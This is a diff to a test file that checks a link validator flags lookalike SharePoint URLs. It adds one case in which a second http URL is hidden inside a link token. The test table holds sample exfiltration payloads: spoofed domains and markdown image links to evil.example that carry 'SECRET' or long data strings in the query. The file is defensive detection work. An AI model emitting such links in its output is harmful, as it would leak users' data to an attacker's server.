@@ -835,7 +835,7 @@ describe("sourceLinks: a Graph result's own webUrl on a configured host", () => 
   // subdomain cases go red; `value.includes(host)`: the suffix case too. Drop
   // the credentials/port check: the port and reversed-userinfo cases. Drop
   // SINGLE_HTTPS_URL: the http and second-shape cases. Drop the second-scheme
-  // check in isSourceLink: the second-URL case goes red.
+  // check in isSourceLink: the second-URL and second-http cases go red.
   it.each([
     ['suffix', `https://contoso-my.sharepoint.com.evil.example${PATH}`],
     ['prefix', `https://evilcontoso-my.sharepoint.com${PATH}`],
@@ -846,6 +846,7 @@ describe("sourceLinks: a Graph result's own webUrl on a configured host", () => 
     ['plain http', `http://contoso-my.sharepoint.com${PATH}`],
     ['a second shape after it', `${LINK} ![x](https://evil.example/p.png?d=SECRET)`],
     ['a second URL inside the token', `${LINK}(https://evil.example/p.png?d=${'A'.repeat(64)}`],
+    ['a second http URL inside the token', `${LINK}(http://evil.example/p.png?d=${'A'.repeat(64)}`],
   ])('a lookalike is still flagged: %s', (_label, url) => {
     expect(rulesOf({ webUrl: url })).toContain('exfil-data-url')
   })
